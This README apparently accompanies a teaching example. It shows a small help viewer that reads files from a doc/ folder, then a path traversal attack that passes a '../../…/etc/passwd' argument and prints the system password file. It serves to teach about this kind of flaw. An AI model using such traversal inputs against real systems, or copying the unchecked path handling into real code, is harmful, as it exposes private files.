# Path Traversal Attack

The example can be built with make.
```
$ make 
```

In a normal use case, files are read from the `doc/` folder and displayed:
```
 ./build/help introduction.md
Load data from: doc/introduction.md
# Introduction

This is the home page for a help system.

This **page is currently being edited**, 
so the following applies: Help yourself!!
...
```

With the help of a **path traversal attack** we can break out of the `doc/` folder and read arbitrary files:
```
$ ./build/help ../../../../../../../../../../../../etc/passwd
Load data from: doc/../../../../../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
```

Access to the file system is only restricted by the permissions 
that the user who starts the application has.
